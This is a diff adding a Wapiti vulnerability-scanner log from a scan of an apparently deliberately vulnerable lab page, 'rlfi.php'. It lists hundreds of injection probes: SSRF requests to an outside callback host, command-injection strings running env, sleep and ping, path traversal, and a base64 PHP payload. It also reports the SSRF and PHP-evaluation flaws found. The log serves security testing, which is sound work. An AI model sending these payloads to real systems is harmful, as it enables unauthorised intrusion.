@@ -1,0 +1,1242 @@
+2024-03-20 16:55:35.473 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/rlfi.php?language=fuzz&action=go (0)
+2024-03-20 16:55:35.590 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/rlfi.php?action=go&language=lang_nl.php (1)
+2024-03-20 16:55:35.590 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2
+2024-03-20 16:55:35.591 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109
+2024-03-20 16:55:35.591 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/rlfi.php (1)
+2024-03-20 16:55:35.781 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
+2024-03-20 16:55:35.781 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_cc8647fd.db
+2024-03-20 16:55:35.784 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 5 URLs and forms during the scan
+2024-03-20 16:55:35.818 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
+2024-03-20 16:55:35.818 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
+2024-03-20 16:55:35.924 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
+2024-03-20 16:55:35.937 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
+2024-03-20 16:55:35.937 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
+2024-03-20 16:55:36.005 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
+2024-03-20 16:55:36.017 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/rlfi.php?language=fuzz&action=go (0)
+2024-03-20 16:55:36.017 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/rlfi.php?language=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fux5xj0%2F1%2F6c616e6775616765%2F&action=go (0)
+2024-03-20 16:55:36.194 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/rlfi.php?language=fuzz&action=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fux5xj0%2F1%2F616374696f6e%2F (0)
+2024-03-20 16:55:36.215 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/rlfi.php?action=go&language=lang_nl.php (1)
+2024-03-20 16:55:36.216 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/rlfi.php?action=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fux5xj0%2F3%2F616374696f6e%2F&language=lang_nl.php (1)
+2024-03-20 16:55:36.225 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/rlfi.php?action=go&language=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fux5xj0%2F3%2F6c616e6775616765%2F (1)
+2024-03-20 16:55:36.380 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/rlfi.php (1)
+2024-03-20 16:55:36.392 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109
+2024-03-20 16:55:36.393 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fux5xj0%2F2%2F666f726d5f627567%2F&bug=109
+2024-03-20 16:55:36.401 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fux5xj0%2F2%2F627567%2F
+2024-03-20 16:55:36.416 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2
+2024-03-20 16:55:36.416 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fux5xj0%2F4%2F666f726d5f73656375726974795f6c6576656c%2F&security_level=2
+2024-03-20 16:55:36.425 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fux5xj0%2F4%2F73656375726974795f6c6576656c%2F
+2024-03-20 16:55:36.456 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=ux5xj0 for results, please wait...
+2024-03-20 16:55:38.654 | RED      | wapitiCore.attack.mod_ssrf:finish:246 - ---
+2024-03-20 16:55:38.654 | RED      | wapitiCore.attack.mod_ssrf:finish:247 - SSRF vulnerability in http://web/rlfi.php via injection in the parameter language
+2024-03-20 16:55:38.655 | RED      | wapitiCore.attack.mod_ssrf:finish:254 - Evil request:
+2024-03-20 16:55:38.655 | RED      | wapitiCore.attack.mod_ssrf:finish:255 -     GET /rlfi.php?language=http%3A%2F%2Fexternal.url%2Fpage&action=go HTTP/1.1
+2024-03-20 16:55:38.655 | RED      | wapitiCore.attack.mod_ssrf:finish:256 - ---
+2024-03-20 16:55:38.725 | RED      | wapitiCore.attack.mod_ssrf:finish:246 - ---
+2024-03-20 16:55:38.725 | RED      | wapitiCore.attack.mod_ssrf:finish:247 - SSRF vulnerability in http://web/rlfi.php via injection in the parameter language
+2024-03-20 16:55:38.725 | RED      | wapitiCore.attack.mod_ssrf:finish:254 - Evil request:
+2024-03-20 16:55:38.725 | RED      | wapitiCore.attack.mod_ssrf:finish:255 -     GET /rlfi.php?action=go&language=http%3A%2F%2Fexternal.url%2Fpage HTTP/1.1
+2024-03-20 16:55:38.726 | RED      | wapitiCore.attack.mod_ssrf:finish:256 - ---
+2024-03-20 16:55:38.726 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
+2024-03-20 16:55:38.747 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/rlfi.php?language=fuzz&action=go (0)
+2024-03-20 16:55:38.747 | BLUE     | wapitiCore.attack.mod_cookieflags:attack:55 - Checking cookie : PHPSESSID
+2024-03-20 16:55:38.747 | RED      | wapitiCore.attack.mod_cookieflags:attack:57 - HttpOnly flag is not set in the cookie : PHPSESSID
+2024-03-20 16:55:38.789 | RED      | wapitiCore.attack.mod_cookieflags:attack:66 - Secure flag is not set in the cookie : PHPSESSID
+2024-03-20 16:55:38.833 | BLUE     | wapitiCore.attack.mod_cookieflags:attack:55 - Checking cookie : security_level
+2024-03-20 16:55:38.833 | RED      | wapitiCore.attack.mod_cookieflags:attack:57 - HttpOnly flag is not set in the cookie : security_level
+2024-03-20 16:55:38.874 | RED      | wapitiCore.attack.mod_cookieflags:attack:66 - Secure flag is not set in the cookie : security_level
+2024-03-20 16:55:38.952 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
+2024-03-20 16:55:38.963 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/rlfi.php?language=fuzz&action=go (0)
+2024-03-20 16:55:38.977 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
+2024-03-20 16:55:39.074 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
+2024-03-20 16:55:39.087 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/rlfi.php?language=fuzz&action=go (0)
+2024-03-20 16:55:39.087 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/rlfi.php?language=https%3A%2F%2Fopenbugbounty.org%2F&action=go
+2024-03-20 16:55:44.696 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/rlfi.php?language=%2F%2Fopenbugbounty.org%2F&action=go
+2024-03-20 16:55:44.729 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/rlfi.php?language=fuzz&action=https%3A%2F%2Fopenbugbounty.org%2F
+2024-03-20 16:55:44.764 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/rlfi.php?language=fuzz&action=%2F%2Fopenbugbounty.org%2F
+2024-03-20 16:55:44.807 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/rlfi.php?action=go&language=lang_nl.php (1)
+2024-03-20 16:55:44.808 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/rlfi.php?action=https%3A%2F%2Fopenbugbounty.org%2F&language=lang_nl.php
+2024-03-20 16:55:44.841 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/rlfi.php?action=%2F%2Fopenbugbounty.org%2F&language=lang_nl.php
+2024-03-20 16:55:44.873 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/rlfi.php?action=go&language=https%3A%2F%2Fopenbugbounty.org%2F
+2024-03-20 16:55:46.703 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/rlfi.php?action=go&language=%2F%2Fopenbugbounty.org%2F
+2024-03-20 16:55:46.734 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/rlfi.php (1)
+2024-03-20 16:55:46.756 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
+2024-03-20 16:55:46.771 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/rlfi.php?language=fuzz&action=go (0)
+2024-03-20 16:55:46.772 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=%3Benv%3B&action=go (0)
+2024-03-20 16:55:46.780 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=%7Cenv%7C&action=go (0)
+2024-03-20 16:55:46.789 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=a%3Benv%3B&action=go (0)
+2024-03-20 16:55:46.797 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=a%3Benv%3B&action=go (0)
+2024-03-20 16:55:46.807 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&action=go (0)
+2024-03-20 16:55:46.815 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz%3Benv%3B&action=go (0)
+2024-03-20 16:55:46.825 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz%0Aenv%3B&action=go (0)
+2024-03-20 16:55:46.835 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=%26set%26&action=go (0)
+2024-03-20 16:55:46.843 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=set&action=go (0)
+2024-03-20 16:55:46.859 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=env&action=go (0)
+2024-03-20 16:55:46.868 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=%2Fe%00&action=go (0)
+2024-03-20 16:55:46.876 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=go (0)
+2024-03-20 16:55:46.884 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=go (0)
+2024-03-20 16:55:46.892 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=go (0)
+2024-03-20 16:55:46.900 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=go (0)
+2024-03-20 16:55:46.909 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=go (0)
+2024-03-20 16:55:46.924 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=go (0)
+2024-03-20 16:55:46.933 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=go (0)
+2024-03-20 16:55:46.942 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=go (0)
+2024-03-20 16:55:46.952 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=go (0)
+2024-03-20 16:55:46.961 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=go (0)
+2024-03-20 16:55:46.971 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=go (0)
+2024-03-20 16:55:46.979 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=go (0)
+2024-03-20 16:55:46.989 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&action=go (0)
+2024-03-20 16:55:47.066 | RED      | wapitiCore.attack.mod_exec:attack:202 - ---
+2024-03-20 16:55:47.066 | RED      | wapitiCore.attack.mod_exec:attack:203 - PHP evaluation in http://web/rlfi.php via injection in the parameter language
+2024-03-20 16:55:47.066 | RED      | wapitiCore.attack.mod_exec:attack:209 - Evil request:
+2024-03-20 16:55:47.066 | RED      | wapitiCore.attack.mod_exec:attack:210 -     GET /rlfi.php?language=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&action=go HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: security_level=0
+2024-03-20 16:55:47.066 | RED      | wapitiCore.attack.mod_exec:attack:211 - ---
+2024-03-20 16:55:47.069 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=%3Benv%3B (0)
+2024-03-20 16:55:47.078 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=%7Cenv%7C (0)
+2024-03-20 16:55:47.091 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=a%3Benv%3B (0)
+2024-03-20 16:55:47.099 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=a%3Benv%3B (0)
+2024-03-20 16:55:47.107 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (0)
+2024-03-20 16:55:47.117 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%3Benv%3B (0)
+2024-03-20 16:55:47.126 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=go%0Aenv%3B (0)
+2024-03-20 16:55:47.134 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=%26set%26 (0)
+2024-03-20 16:55:47.143 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=set (0)
+2024-03-20 16:55:47.151 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=env (0)
+2024-03-20 16:55:47.159 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=%2Fe%00 (0)
+2024-03-20 16:55:47.168 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 16:55:47.175 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 16:55:47.184 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 16:55:47.191 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 16:55:47.199 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 16:55:47.207 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 16:55:47.215 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 16:55:47.223 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 16:55:47.230 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 16:55:47.238 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 16:55:47.246 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 16:55:47.254 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 16:55:47.262 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (0)
+2024-03-20 16:55:47.270 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=a%60%29%60 (0)
+2024-03-20 16:55:47.277 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=a%60sleep%2060%60 (0)
+2024-03-20 16:55:47.285 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=a%3Bsleep%2060%3B (0)
+2024-03-20 16:55:47.293 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=a%7Csleep%2060%3B (0)
+2024-03-20 16:55:47.302 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?language=fuzz&action=%26ping%20-n%2025%20127.0.0.1%26 (0)
+2024-03-20 16:55:47.318 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/rlfi.php?action=go&language=lang_nl.php (1)
+2024-03-20 16:55:47.320 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=%3Benv%3B&language=lang_nl.php (1)
+2024-03-20 16:55:47.328 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=%7Cenv%7C&language=lang_nl.php (1)
+2024-03-20 16:55:47.336 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=a%3Benv%3B&language=lang_nl.php (1)
+2024-03-20 16:55:47.343 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=a%3Benv%3B&language=lang_nl.php (1)
+2024-03-20 16:55:47.352 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&language=lang_nl.php (1)
+2024-03-20 16:55:47.360 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go%3Benv%3B&language=lang_nl.php (1)
+2024-03-20 16:55:47.368 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go%0Aenv%3B&language=lang_nl.php (1)
+2024-03-20 16:55:47.376 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=%26set%26&language=lang_nl.php (1)
+2024-03-20 16:55:47.385 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=set&language=lang_nl.php (1)
+2024-03-20 16:55:47.393 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=env&language=lang_nl.php (1)
+2024-03-20 16:55:47.402 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=%2Fe%00&language=lang_nl.php (1)
+2024-03-20 16:55:47.410 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&language=lang_nl.php (1)
+2024-03-20 16:55:47.419 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&language=lang_nl.php (1)
+2024-03-20 16:55:47.428 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&language=lang_nl.php (1)
+2024-03-20 16:55:47.436 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&language=lang_nl.php (1)
+2024-03-20 16:55:47.445 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&language=lang_nl.php (1)
+2024-03-20 16:55:47.454 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&language=lang_nl.php (1)
+2024-03-20 16:55:47.462 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&language=lang_nl.php (1)
+2024-03-20 16:55:47.471 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&language=lang_nl.php (1)
+2024-03-20 16:55:47.480 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&language=lang_nl.php (1)
+2024-03-20 16:55:47.488 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&language=lang_nl.php (1)
+2024-03-20 16:55:47.497 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&language=lang_nl.php (1)
+2024-03-20 16:55:47.506 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&language=lang_nl.php (1)
+2024-03-20 16:55:47.515 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&language=lang_nl.php (1)
+2024-03-20 16:55:47.524 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=a%60%29%60&language=lang_nl.php (1)
+2024-03-20 16:55:47.541 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=a%60sleep%2060%60&language=lang_nl.php (1)
+2024-03-20 16:55:47.557 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=a%3Bsleep%2060%3B&language=lang_nl.php (1)
+2024-03-20 16:55:47.572 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=a%7Csleep%2060%3B&language=lang_nl.php (1)
+2024-03-20 16:55:47.580 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=%26ping%20-n%2025%20127.0.0.1%26&language=lang_nl.php (1)
+2024-03-20 16:55:47.590 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go&language=%3Benv%3B (1)
+2024-03-20 16:55:47.599 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go&language=%7Cenv%7C (1)
+2024-03-20 16:55:47.608 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go&language=a%3Benv%3B (1)
+2024-03-20 16:55:47.619 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go&language=a%3Benv%3B (1)
+2024-03-20 16:55:47.628 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go&language=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (1)
+2024-03-20 16:55:47.637 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go&language=lang_nl.php%3Benv%3B (1)
+2024-03-20 16:55:47.645 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go&language=lang_nl.php%0Aenv%3B (1)
+2024-03-20 16:55:47.654 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go&language=%26set%26 (1)
+2024-03-20 16:55:47.663 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/rlfi.php?action=go&language=set (1)
